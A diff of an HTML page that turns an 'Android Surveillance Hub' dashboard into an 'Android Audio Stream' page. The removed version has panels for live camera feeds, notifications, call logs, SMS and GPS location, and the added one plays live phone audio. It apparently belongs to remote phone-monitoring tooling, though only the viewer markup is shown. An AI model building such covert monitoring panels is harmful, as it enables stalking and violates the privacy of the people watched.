@@ -1,201 +1,113 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Android Surveillance Hub</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Android Audio Stream</title>
 
-    <!-- Leaflet Map CSS -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
-    <style>
-        /* ------------------------------
-           GLOBAL UI STYLES
-        -------------------------------*/
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Courier New', monospace;
+      background: #0d0d0d;
+      color: #00ff00;
+      min-height: 100vh;
+    }
 
-        body {
-            font-family: 'Courier New', monospace;
-            background: #0d0d0d;
-            color: #00ff00;
-            min-height: 100vh;
-        }
+    .header {
+      padding: 12px;
+      background: #111;
+      border-bottom: 2px solid #00ff00;
+      text-align: center;
+      position: sticky;
+      top: 0;
+    }
 
-        .header {
-            padding: 12px;
-            background: #111;
-            border-bottom: 2px solid #00ff00;
-            text-align: center;
-            position: sticky;
-            top: 0;
-            z-index: 10;
-        }
+    h1 {
+      font-size: 1.6rem;
+      text-shadow: 0 0 10px #00ff00;
+    }
 
-        h1 {
-            font-size: 1.6rem;
-            text-shadow: 0 0 10px #00ff00;
-        }
+    #status {
+      margin-top: 8px;
+      padding: 8px;
+      border: 1px solid #00ff00;
+      display: inline-block;
+    }
 
-        #status {
-            margin-top: 8px;
-            padding: 8px;
-            border: 1px solid #00ff00;
-            display: inline-block;
-        }
+    .main {
+      padding: 24px;
+      max-width: 800px;
+      margin: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
 
-        #retryButton {
-            margin-top: 10px;
-            display: none;
-            padding: 8px 16px;
-            background: #00ff00;
-            color: black;
-            border-radius: 6px;
-            border: none;
-            cursor: pointer;
-        }
+    .card {
+      background: #111;
+      border: 1px solid #00ff00;
+      padding: 16px;
+      border-radius: 14px;
+    }
 
-        /* ------------------------------
-           GRID LAYOUT
-        -------------------------------*/
-        .main-content { padding: 20px; }
+    audio {
+      width: 100%;
+      margin-top: 10px;
+    }
 
-        .main-layout {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 24px;
-            height: calc(100vh - 160px);
-        }
+    #debugLog {
+      height: 180px;
+      overflow-y: auto;
+      border: 1px solid #00ff00;
+      padding: 10px;
+      font-size: 0.85rem;
+    }
 
-        .video-section { display: flex; flex-direction: column; gap: 20px; }
-
-        .video-container {
-            background: #111;
-            border: 1px solid #00ff00;
-            border-radius: 14px;
-            padding: 16px;
-        }
-
-        .video-header { display: flex; justify-content: space-between; }
-
-        .remote-video {
-            width: 100%;
-            height: 300px;
-            background: black;
-            border-radius: 10px;
-            border: 2px solid #00ff00;
-            object-fit: cover;
-        }
-
-        .card {
-            background: #111;
-            border: 1px solid #00ff00;
-            padding: 16px;
-            border-radius: 14px;
-            height: 100%;
-            overflow: hidden;
-        }
-
-        .card h2 { margin-bottom: 10px; }
-
-        #notificationList, #callLogList, #smsList {
-            overflow-y: auto;
-            height: 100%;
-        }
-
-        .notification, .call-log, .sms-message {
-            padding: 10px;
-            border: 1px solid #00ff00;
-            margin-bottom: 10px;
-            border-radius: 8px;
-        }
-
-        #mapContainer {
-            width: 100%;
-            height: 100%;
-            min-height: 200px;
-            border-radius: 10px;
-            overflow: hidden;
-        }
-
-        #debugLog { height: 160px; overflow-y: auto; border: 1px solid #00ff00; padding: 10px; }
-    </style>
-
+    button {
+      margin-top: 10px;
+      padding: 8px 16px;
+      background: #00ff00;
+      color: black;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
 </head>
+
 <body>
 
-    <!-- HEADER -->
-    <div class="header">
-        <h1>Android Surveillance Hub</h1>
-        <div id="status">Connecting...</div>
-        <button id="retryButton">Retry</button>
+  <!-- HEADER -->
+  <div class="header">
+    <h1>Android Audio Stream</h1>
+    <div id="status">Connecting…</div>
+  </div>
+
+  <!-- MAIN -->
+  <div class="main">
+
+    <!-- AUDIO -->
+    <div class="card">
+      <h2>Live Audio</h2>
+      <audio id="remoteAudio" autoplay controls></audio>
     </div>
 
-    <!-- MAIN GRID -->
-    <div class="main-content">
-        <div class="main-layout">
-
-            <!-- LEFT: CAMERAS -->
-            <div class="video-section">
-
-                <div class="video-container">
-                    <div class="video-header">
-                        <h2>Front Camera</h2><span>● LIVE</span>
-                    </div>
-                    <video id="remoteVideoFront" class="remote-video" autoplay playsinline></video>
-                </div>
-
-                <div class="video-container">
-                    <div class="video-header">
-                        <h2>Back Camera</h2><span>● LIVE</span>
-                    </div>
-                    <video id="remoteVideoBack" class="remote-video" autoplay playsinline></video>
-                </div>
-
-            </div>
-
-            <!-- RIGHT: PANELS -->
-            <div class="content-right">
-
-                <div class="card" style="height: 200px;">
-                    <h2>Notifications</h2>
-                    <div id="notificationList"></div>
-                </div>
-
-                <div style="display:flex; gap:16px; height: 300px;">
-                    <div class="card" style="flex:1;">
-                        <h2>Call Logs</h2>
-                        <div id="callLogList"></div>
-                    </div>
-
-                    <div class="card" style="flex:1;">
-                        <h2>SMS Messages</h2>
-                        <div id="smsList"></div>
-                    </div>
-                </div>
-
-                <div class="card" style="height: 260px;">
-                    <h2>GPS Location</h2>
-                    <div id="mapContainer"></div>
-                </div>
-
-                <div class="card" style="height: 150px;">
-                    <h2>Debug Log</h2>
-                    <div id="logMessages"></div>
-                </div>
-
-            </div>
-
-        </div>
+    <!-- DEBUG -->
+    <div class="card">
+      <h2>Debug Log</h2>
+      <div id="debugLog"></div>
+      <button id="retryButton">Reconnect</button>
     </div>
 
-    <!-- Leaflet JS -->
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  </div>
 
-    <!-- Socket.IO from Render -->
-    <script src="/socket.io/socket.io.js"></script>
+  <!-- Socket.IO -->
+  <script src="/socket.io/socket.io.js"></script>
 
-    <!-- Your client logic -->
-    <script src="client.js"></script>
+  <!-- Client logic -->
+  <script src="client.js"></script>
 
 </body>
 </html>
